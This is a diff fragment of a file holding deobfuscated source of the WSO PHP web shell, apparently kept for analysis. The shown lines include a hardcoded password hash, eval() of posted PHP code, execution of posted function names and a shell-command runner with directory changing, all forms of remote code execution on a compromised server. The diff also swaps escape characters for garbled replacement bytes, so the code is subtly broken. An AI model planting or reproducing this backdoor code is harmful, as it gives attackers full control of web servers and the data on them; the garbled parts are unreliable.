@@ -1,6 +1,7 @@
-obf code: see `wso_obfuscated_v1.php`
+obf code: see wso_obfuscated_v1.php
 
 deobf code:
+
 ```php
 <?php $auth_pass = "6244da94938ddf690522f800d66587b7";
 $color = "#df5";
@@ -367,7 +368,7 @@ pre{font-family:Courier,Monospace;}
                                                     eval($_POST['p1']);
                                                     $temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "
 
-	\' ") . "';
+	\'�") . "';
 ";
                                                     echo strlen($temp), "
 ", $temp;
@@ -589,7 +590,7 @@ pre{font-family:Courier,Monospace;}
                                                         if (in_array($_POST['p1'], $stringTools)) echo $_POST['p1']($_POST['p2']);
                                                         $temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "
 
-	\' ") . "';
+	\'�") . "';
 ";
                                                         echo strlen($temp), "
 ", $temp;
@@ -804,7 +805,7 @@ pre{font-family:Courier,Monospace;}
 $ " . $_POST['p1'] . "
 " . wsoEx($_POST['p1']), "
 
-	\' "));
+	\'�"));
                                                             if (preg_match("!.*cd\s+([^;]+)$!", $_POST['p1'], $match)) {
                                                                 if (@chdir($match[1])) {
                                                                     $GLOBALS['cwd'] = @getcwd();
